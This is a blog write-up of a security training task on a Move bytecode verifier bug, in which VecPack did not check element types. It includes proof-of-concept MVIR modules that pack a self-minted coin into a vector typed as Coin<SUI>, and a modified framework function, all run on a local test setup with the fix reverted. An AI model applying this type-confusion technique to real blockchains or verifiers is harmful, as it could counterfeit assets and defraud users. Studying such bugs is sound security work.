---
layout: post
title: "Poc for VecPack bug in Move Compiler Task[04]"
date: 2023-07-26 09:27:43
categories: blog
---

This is the last task which is writing a poc for a bug in move compiler code by reverting the patch.

<!--more-->

I was given this task :

`Please briefly describe this bug and write a proof of concept against Sui devnet with this patch reverted: https://github.com/move-language/move/pull/491. to demonstrate impact, please write an exploit which will enable you to mint an arbitrary amount of Coin<SUI>  against a localnet validator with this patch reverted.` [PR](https://github.com/move-language/move/pull/491)

There is not much details in the PR about the bug except the file changes.

`Before Fix`

```rust
 Bytecode::VecPack(idx, num) => {
            let element_type = &verifier.resolver.signature_at(*idx).0[0];
            for _ in 0..*num {
                verifier.stack.pop().unwrap();
            }
```

`After Fix`

```rust
  Bytecode::VecPack(idx, num) => {
            let element_type = &verifier.resolver.signature_at(*idx).0[0];
            for _ in 0..*num {
                let operand_type = verifier.stack.pop().unwrap();
                if element_type != &operand_type {
                    return Err(verifier.error(StatusCode::TYPE_MISMATCH, offset));
                }
            }
```

### Bug :

The move-bytecode-verifier not checking the Vector type and the values in the VecPack instruction is same or not.

### Writing POC (Patch reverted):

-   I first checked how the `VecPack` instruction is created in move .

-   After writing a move module i disassembled the bytecode where I found that only `vector:empty()` creating `VecPack` instruction and move compiler won't
    let me push a different type data into Vector

-   I came across the `move intermediate language (MVIR)` which have the `vec_pack_n` instruction.So I have seen how to write move module in `.mvir`.

After looking into some mvir examples in the repo , I wrote a simple code to check if my code is correct or not.

I didn't find a way to compile and verify the mvir code , so I used the testing framework to compile and verify the module.

```rust

fn main() {
    use move_ir_compiler::Compiler as IRCompiler;
    let new_compiler = IRCompiler { deps: vec![] };

    let new_module_code = "
    module 0x2.Math {

        test() {
            let v1: vector<bool>;

        label b0:
            v1 = vec_pack_1<bool>(122221);
            return;
        }
      }

    ";
    let new_module = new_compiler
        .into_compiled_module(new_module_code)
        .expect("Failed to compile");
    let status = move_bytecode_verifier::verify_module_unmetered(&new_module);
    println!("Verfied Status - {:#?}", status);

```

**Output**

```bash

Verfied Status - Ok(
    (),
```

Now I know how to write mvir in move and verify it but for the poc I need Sui blockchain context. For that I used `sui_transactional_test_runner` .

`sui_transactional_test_runner` - which is used by the sui to test the code.

I started writing the actual poc ,

```rust

//# publish
module 0x0.mycoin {
      import 0x2.object;
      import 0x2.tx_context;
      import 0x2.transfer;
	    import 0x2.sui;
     	import 0x2.coin;
     	import 0x1.vector;
     	import 0x1.option;

     	struct Wrapper has key {
            id: object.UID,
     		    coins: vector<coin.Coin<sui.SUI>>,
       }

     	struct MYCOIN has drop {
			 id: u64,
		  }

     	test(ctx: &mut tx_context.TxContext){
     		let v1: vector<coin.Coin<sui.SUI>>;
            let wrap: Self.Wrapper;
     	label b0:
     		v1 = vec_pack_1<coin.Coin<sui.SUI>>(MYCOIN {id : 10});
            wrap = Wrapper { id : object.new(copy(ctx)), coins: move(v1) } ;
     		transfer.transfer<Self.Wrapper>(move(wrap),tx_context.sender(freeze(copy(ctx))));
			return;
     	}

     }
```

```rust
pub const TEST_DIR: &str = "tests";
use sui_transactional_test_runner::run_test;

datatest_stable::harness!(run_test, TEST_DIR, r".*\.(mvir|move)$");
```

**Output:**

```rust
processed 1 task

task 0 'publish'. lines 1-30:
created: object(1,0)
mutated: object(0,0)
gas summary: computation_cost: 1000000, storage_cost: 6695600,  storage_rebate: 0, non_refundable_storage_fee: 0
```

When I run this by publishing the module it is working fine.It's just publishing the module but I need to run it.

After checking some example tests I found that init function which is invoking along with publish command.

So I renamed the functino to `init` and ran the tests where I encountered a Error which took most of my time debugging it.

**Error** - `Failed to deserialize already serialized Move value`

After debugging I found that Vector type and the elements in the vec_pack should maintain same structure.

To check that I used this module :

```rust
//# publish
module 0x0.mycoin {
        import 0x2.object;
        import 0x2.tx_context;
        import 0x2.transfer;
        import 0x2.sui;
        import 0x2.coin;
        import 0x1.vector;
        import 0x1.option;

        struct MYCOIN has store {
             id: u64,
        }

        struct DCOIN has store {
             id:u64,
        }

        struct Wrapper has key {
            id: object.UID,
            coins: vector<Self.MYCOIN>,
        }



         init(ctx: &mut tx_context.TxContext){
             let v1: vector<Self.MYCOIN>;
             let wrap: Self.Wrapper;
         label b0:
             v1 = vec_pack_2<Self.MYCOIN>(DCOIN{id :3 },DCOIN {id:4});
             wrap = Wrapper{ id : object.new(copy(ctx)) ,coins: move(v1)};
             transfer.transfer<Self.Wrapper>(move(wrap),tx_context.sender(freeze(copy(ctx))));
            return;
         }

     }
```

It's working fine ,Now to mint `Coin<SUI>` , I need to pass another `Coin<MYCOIN>`.

I wrote this code to mint `MYCOIN` in **mvir** using Coin module from **sui**.

```rust
//# publish
module 0x0.mycoin {
        import 0x2.object;
        import 0x2.tx_context;
        import 0x2.transfer;
        import 0x2.sui;
        import 0x2.coin;
		import 0x2.url;
		import 0x2.balance;
        import 0x1.vector;
        import 0x1.option;


		struct MYCOIN has drop { dummy : bool}

		struct Wrapper has key {
            id: object.UID,
            coins: vector<coin.Coin<sui.SUI>>,
        }

		init(_otw: Self.MYCOIN,ctx: &mut tx_context.TxContext){
            let v1: vector<coin.Coin<sui.SUI>>;
            let wrap: Self.Wrapper;
			let cap: coin.TreasuryCap<Self.MYCOIN>;
			let mutcap: &mut coin.TreasuryCap<Self.MYCOIN>;
			let metadata : coin.CoinMetadata<Self.MYCOIN>;
			let vec : vector<u8>;
			let decimals: u8;
			let symbol: vector<u8>;
			let name: vector<u8>;
			let description: vector<u8>;
			let icon_url: option.Option<url.Url>;
			let c : coin.Coin<Self.MYCOIN>;
         label b0:
			decimals = 2u8;
			symbol = h"bac1ac";
			name = h"bac1ac";
			description = h"bac1ac";
			icon_url = option.none<url.Url>();


			cap, metadata= coin.create_currency<Self.MYCOIN>(move(_otw),move(decimals),move(symbol),move(name),move(description),move(icon_url),copy(ctx));

			transfer.public_freeze_object<coin.CoinMetadata<Self.MYCOIN>>(move(metadata));

			mutcap = &mut cap;
			c = coin.mint<Self.MYCOIN>(move(mutcap),20u64,copy(ctx));

			transfer.public_transfer<coin.TreasuryCap<Self.MYCOIN>>(move(cap), tx_context.sender(freeze(copy(ctx))));

            return;
        }

    }
```

This is failing by error `CALL_MISMATCH_TYPE_ARGUMENTS` ,

due to the line : `mutcap = &mut cap`

I didn’t find any resources to take mutable references or taking a resource from address. (I move there is `borrow_global_mut<TYPE>(copy(addr))` to take mutable reference).

After that I wrote a sui source in `/sui/crates/sui-framework/packages/sui-framework/sources` to return a `COIN` , so we can call the module function from **mvir** and use the COIN to pack.

The code look like this , but this won’t work as witness should be `one time` passed value.

```rust
fun get_coin(witness: MYCOIN, ctx: &mut TxContext) :Coin<MYCOIN> {
        let (treasury_cap, metadata) = coin::create_currency(witness, 2, b"MYCOIN", b"", b"", option::none(), ctx);
        transfer::public_freeze_object(metadata);
		let fake_coin = coin::mint<MYCOIN>(&mut treasury_cap,ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
		fake_coin
    }
```

**As of my knowledge, There is no way I can get the `treasury_cap` as mutable reference or get the `coin` directly without the `treasury_cap`.**

I got an idea to return the coin in the create_currency function in **`coin.move` .** We can directly use that returned value in `vec_pack` .

I created a function which is similar to `create_currency` :

`create_currency_v2` :

```rust
public fun create_currency_v2<T: drop>(
        witness: T,
        decimals: u8,
        symbol: vector<u8>,
        name: vector<u8>,
        description: vector<u8>,
        icon_url: Option<Url>,
        ctx: &mut TxContext
    ): (TreasuryCap<T>, CoinMetadata<T>, Coin<T>) {
        // Make sure there's only one instance of the type T
        assert!(sui::types::is_one_time_witness(&witness), EBadWitness);

		let tre = TreasuryCap {
                id: object::new(ctx),
                total_supply: balance::create_supply(witness)
            };
		let coin = mint(&mut tre, 100, ctx);

        (
            tre,
            CoinMetadata {
                id: object::new(ctx),
                decimals,
                name: string::utf8(b"coin_nam"),
                symbol: ascii::string(b"symbol"),
                description: string::utf8(b"description"),
                icon_url : option::none()
            },
			coin
        )
    }
```

Here I’m minting the `coin` and returning along with the `treasuryCap` and `CoinMetadata`

In **mvir** exploit i’m directly packing the minted coin(`Coin<MYCOIN>`) in `Coin<SUI>` type vector using `vec_pack_1`.

**Final Code :**

```rust
//# publish
module 0x0.mycoin {
        import 0x2.object;
        import 0x2.tx_context;
        import 0x2.transfer;
        import 0x2.sui;
        import 0x2.coin;
				import 0x2.url;
        import 0x1.vector;
        import 0x1.option;


		struct MYCOIN has drop { dummy : bool}

		struct Wrapper has key {
            id: object.UID,
            coins: vector<coin.Coin<sui.SUI>>,
        }

		init(_otw: Self.MYCOIN,ctx: &mut tx_context.TxContext){
            let v1: vector<coin.Coin<sui.SUI>>;
            let wrap: Self.Wrapper;
			let cap: coin.TreasuryCap<Self.MYCOIN>;
			let mutcap: &mut coin.TreasuryCap<Self.MYCOIN>;
			let metadata : coin.CoinMetadata<Self.MYCOIN>;
			let vec : vector<u8>;
			let decimals: u8;
			let symbol: vector<u8>;
			let name: vector<u8>;
			let description: vector<u8>;
			let icon_url: option.Option<url.Url>;
			let c : coin.Coin<Self.MYCOIN>;
         label b0:
			decimals = 2u8;
			symbol = h"bac1ac";
			name = h"bac1ac";
			description = h"bac1ac";
			icon_url = option.none<url.Url>();


			cap, metadata, c = coin.create_currency_v2<Self.MYCOIN>(move(_otw),move(decimals),move(symbol),move(name),move(description),move(icon_url),copy(ctx));

			transfer.public_freeze_object<coin.CoinMetadata<Self.MYCOIN>>(move(metadata));

				transfer.public_transfer<coin.TreasuryCap<Self.MYCOIN>>(move(cap), tx_context.sender(freeze(copy(ctx))));
						//packing the Coin<MYCOIN> to Coin<SUI>.
            v1 = vec_pack_1<coin.Coin<sui.SUI>>(move(c));
            wrap = Wrapper{ id : object.new(copy(ctx)) ,coins: move(v1)};
            transfer.transfer<Self.Wrapper>(move(wrap),tx_context.sender(freeze(copy(ctx))));
            return;
        }

    }
```

**OUTPUT :**

The arbitrary mint is successful using `vec_pack` but there is a Check that this transaction neither creates nor destroys SUI.

So I’m getting this error:

```rust
Some("SUI conservation failed: input=300000000000000, output=300000000000100, this transaction either mints or burns SUI")
```

### What I have learned

Through this task , I have understand the internals of the move language and sui move. Testing of move modules(mvir/move).
More over I got a good glance at SUI standard libraries,MOVE standard libraries .

### Sources :

-   [Move](https://github.com/MystenLabs/awesome-move#papers)
-   [Move-Book](https://move-book.com/index.html)
-   [Sui](https://sui.io/developers)
-   [Fixed PR](https://github.com/move-language/move/pull/491/files)
-   [Sui tests](https://github.com/MystenLabs/sui/tree/main/crates/sui-adapter-transactional-tests)
-   [Test Runner](https://github.com/MystenLabs/sui/tree/main/crates/sui-transactional-test-runner)
